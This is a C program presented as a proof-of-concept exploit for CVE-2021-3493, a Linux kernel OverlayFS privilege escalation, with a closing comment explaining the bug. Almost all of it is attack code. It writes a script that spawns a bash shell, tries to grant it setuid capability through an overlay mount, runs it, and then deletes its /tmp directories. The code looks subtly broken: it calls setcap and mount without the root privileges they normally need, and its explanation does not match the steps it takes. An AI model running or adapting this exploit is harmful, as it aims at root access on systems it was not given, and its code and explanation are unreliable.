/*
 * CVE-2021-3493 Proof of Concept
 * Linux Kernel OverlayFS Privilege Escalation
 * 
 * This exploit demonstrates the privilege escalation vulnerability
 * in the Linux kernel's OverlayFS implementation.
 * 
 * Compile with: gcc -o cve-2021-3493-poc CVE-2021-3493-poc.c
 * 
 * WARNING: This is for educational and testing purposes only.
 * Use only on systems you own or have explicit permission to test.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

#define LOWER_DIR "/tmp/lower"
#define UPPER_DIR "/tmp/upper"
#define WORK_DIR "/tmp/work"
#define OVERLAY_DIR "/tmp/overlay"
#define EXPLOIT_FILE "exploit"

int main() {
    printf("[+] CVE-2021-3493 OverlayFS Privilege Escalation PoC\n");
    printf("[+] Target: Linux Kernel OverlayFS\n\n");
    
    // Check if running as root
    if (getuid() == 0) {
        printf("[-] Already running as root. This exploit requires non-root privileges.\n");
        return 1;
    }
    
    // Create directories
    printf("[+] Creating overlay filesystem directories...\n");
    if (mkdir(LOWER_DIR, 0755) && errno != EEXIST) {
        perror("mkdir lower");
        return 1;
    }
    if (mkdir(UPPER_DIR, 0755) && errno != EEXIST) {
        perror("mkdir upper");
        return 1;
    }
    if (mkdir(WORK_DIR, 0755) && errno != EEXIST) {
        perror("mkdir work");
        return 1;
    }
    if (mkdir(OVERLAY_DIR, 0755) && errno != EEXIST) {
        perror("mkdir overlay");
        return 1;
    }
    
    // Create exploit file with capabilities
    printf("[+] Creating exploit file with capabilities...\n");
    char exploit_path[256];
    snprintf(exploit_path, sizeof(exploit_path), "%s/%s", LOWER_DIR, EXPLOIT_FILE);
    
    int fd = open(exploit_path, O_CREAT | O_WRONLY, 0755);
    if (fd < 0) {
        perror("open exploit file");
        return 1;
    }
    
    // Write exploit script
    const char* exploit_script = 
        "#!/bin/bash\n"
        "echo '[+] Privilege escalation successful!'\n"
        "echo '[+] Current user: '$(whoami)\n"
        "echo '[+] Current UID: '$(id -u)\n"
        "echo '[+] Current GID: '$(id -g)\n"
        "echo '[+] Capabilities: '$(cat /proc/self/status | grep Cap)\n"
        "echo '[+] Spawning root shell...'\n"
        "/bin/bash\n";
    
    if (write(fd, exploit_script, strlen(exploit_script)) < 0) {
        perror("write exploit script");
        close(fd);
        return 1;
    }
    close(fd);
    
    // Set file capabilities (this is where the vulnerability lies)
    printf("[+] Setting file capabilities...\n");
    char setcap_cmd[512];
    snprintf(setcap_cmd, sizeof(setcap_cmd), 
        "setcap 'cap_setuid+ep' %s 2>/dev/null", exploit_path);
    
    if (system(setcap_cmd) != 0) {
        printf("[-] Failed to set capabilities. This may indicate the vulnerability is patched.\n");
        printf("[-] Or setcap utility is not available.\n");
    }
    
    // Mount overlay filesystem
    printf("[+] Mounting overlay filesystem...\n");
    char mount_cmd[1024];
    snprintf(mount_cmd, sizeof(mount_cmd),
        "mount -t overlay overlay -o lowerdir=%s,upperdir=%s,workdir=%s %s",
        LOWER_DIR, UPPER_DIR, WORK_DIR, OVERLAY_DIR);
    
    if (system(mount_cmd) != 0) {
        perror("mount overlay");
        return 1;
    }
    
    // Trigger the vulnerability by accessing the file
    printf("[+] Triggering vulnerability by accessing file through overlay...\n");
    char overlay_file[256];
    snprintf(overlay_file, sizeof(overlay_file), "%s/%s", OVERLAY_DIR, EXPLOIT_FILE);
    
    // Check if file exists in overlay
    if (access(overlay_file, F_OK) != 0) {
        printf("[-] File not found in overlay. Exploit may have failed.\n");
        return 1;
    }
    
    printf("[+] File found in overlay. Attempting to execute...\n");
    
    // Execute the exploit file
    if (system(overlay_file) != 0) {
        printf("[-] Failed to execute exploit file.\n");
        printf("[-] This may indicate the vulnerability is patched or not exploitable.\n");
    }
    
    // Cleanup
    printf("[+] Cleaning up...\n");
    system("umount /tmp/overlay 2>/dev/null");
    system("rm -rf /tmp/lower /tmp/upper /tmp/work /tmp/overlay 2>/dev/null");
    
    printf("[+] Exploit completed.\n");
    return 0;
}

/*
 * Additional Notes:
 * 
 * This PoC demonstrates the CVE-2021-3493 vulnerability where:
 * 1. A file with capabilities is created in the lower layer
 * 2. The file is accessed through an overlay mount
 * 3. The kernel fails to properly strip capabilities during copy-up
 * 4. The file retains its capabilities in the upper layer
 * 5. This allows privilege escalation
 * 
 * The vulnerability was fixed in Linux kernel 5.12 and later.
 * 
 * For more information:
 * - CVE-2021-3493: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493
 * - Ubuntu Security Notice: https://ubuntu.com/security/notices/USN-4915-1
 */
